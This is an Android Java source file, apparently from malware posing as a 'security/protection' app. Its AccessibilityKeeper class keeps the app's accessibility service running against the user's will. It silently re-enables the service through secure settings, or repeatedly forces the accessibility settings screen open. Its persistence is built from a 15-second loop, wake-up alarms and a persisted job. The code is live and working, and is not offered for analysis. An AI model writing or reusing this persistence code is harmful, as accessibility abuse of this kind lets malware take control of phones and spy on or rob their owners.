package com.seguranca.protecao;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Log;

public class AccessibilityKeeper {

    private static final String TAG = "AccKeeper";
    public  static final String ACAO = "kryptos.ACC_KEEPER";
    private static final long LOOP_MS   = 15000L;
    private static final long ALARME_MS = 60000L;
    private static final long COOLDOWN_CONFIG_MS = 120000L;

    private static Handler h;
    private static boolean loopOn = false;

    public static String componente(Context c) {
        return c.getPackageName() + "/" + UiAssistBridge.class.getName();
    }

    public static boolean ativo(Context c) {
        try {
            String s = Settings.Secure.getString(c.getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (s == null) return false;
            String alvo = componente(c);
            for (String p : s.split(":")) {
                if (p != null && p.trim().equalsIgnoreCase(alvo)) return true;
            }
        } catch (Throwable t) {}
        return false;
    }

    public static boolean temPermissao(Context c) {
        try {
            return c.checkCallingOrSelfPermission(
                    "android.permission.WRITE_SECURE_SETTINGS") == PackageManager.PERMISSION_GRANTED;
        } catch (Throwable t) { return false; }
    }

    public static void garantir(Context c) {
        try {
            if (ativo(c)) return;
            Log.i(TAG, "servico DESLIGADO -> religando");
            if (temPermissao(c) && ligar(c)) { Log.i(TAG, "religado OK"); return; }
            abrirConfig(c);
        } catch (Throwable t) { Log.e(TAG, "garantir " + t); }
    }

    public static boolean ligar(Context c) {
        try {
            String comp = componente(c);
            String atual = Settings.Secure.getString(c.getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (atual == null) atual = "";
            boolean ja = false;
            for (String p : atual.split(":")) {
                if (p != null && p.trim().equalsIgnoreCase(comp)) { ja = true; break; }
            }
            if (!ja) {
                String novo = atual.trim().isEmpty() ? comp : atual + ":" + comp;
                Settings.Secure.putString(c.getContentResolver(),
                        Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, novo);
            }
            Settings.Secure.putInt(c.getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED, 1);
            return ativo(c);
        } catch (Throwable t) { Log.e(TAG, "ligar " + t); return false; }
    }

    public static void abrirConfig(Context c) {
        try {
            SharedPreferences sp = c.getSharedPreferences("kryptos_keeper", Context.MODE_PRIVATE);
            long ult = sp.getLong("ult_config", 0L);
            long agora = System.currentTimeMillis();
            if (agora - ult < COOLDOWN_CONFIG_MS) return;
            PowerManager pm = (PowerManager) c.getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isInteractive()) return;
            sp.edit().putLong("ult_config", agora).apply();
            Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
        } catch (Throwable t) {}
    }

    public static void agendar(Context c) {
        try {
            AlarmManager am = (AlarmManager) c.getSystemService(Context.ALARM_SERVICE);
            if (am == null) return;
            Intent i = new Intent(c, AccessibilityKeeperReceiver.class);
            i.setAction(ACAO);
            PendingIntent pi = PendingIntent.getBroadcast(c, 9901, i,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            long quando = SystemClock.elapsedRealtime() + ALARME_MS;
            boolean exato = true;
            if (Build.VERSION.SDK_INT >= 31) {
                try { exato = am.canScheduleExactAlarms(); } catch (Throwable t) { exato = false; }
            }
            if (exato && Build.VERSION.SDK_INT >= 23) {
                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, quando, pi);
            } else if (Build.VERSION.SDK_INT >= 23) {
                am.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, quando, pi);
            } else {
                am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, quando, pi);
            }
        } catch (Throwable t) { Log.e(TAG, "agendar " + t); }
    }

    public static void agendarJob(Context c) {
        try {
            JobScheduler js = (JobScheduler) c.getSystemService(Context.JOB_SCHEDULER_SERVICE);
            if (js == null) return;
            ComponentName cn = new ComponentName(c, AccessibilityKeeperJob.class);
            JobInfo.Builder b = new JobInfo.Builder(9911, cn).setPersisted(true);
            if (Build.VERSION.SDK_INT >= 24) b.setPeriodic(15L * 60L * 1000L, 5L * 60L * 1000L);
            else b.setPeriodic(15L * 60L * 1000L);
            js.schedule(b.build());
        } catch (Throwable t) {}
    }

    public static void startLoop(final Context c) {
        try {
            if (loopOn) return;
            loopOn = true;
            h = new Handler(Looper.getMainLooper());
            h.postDelayed(new Runnable() {
                @Override public void run() {
                    try { garantir(c.getApplicationContext()); } catch (Throwable t) {}
                    try { agendar(c.getApplicationContext()); } catch (Throwable t) {}
                    if (h != null) h.postDelayed(this, LOOP_MS);
                }
            }, 2500L);
            agendarJob(c);
        } catch (Throwable t) {}
    }
}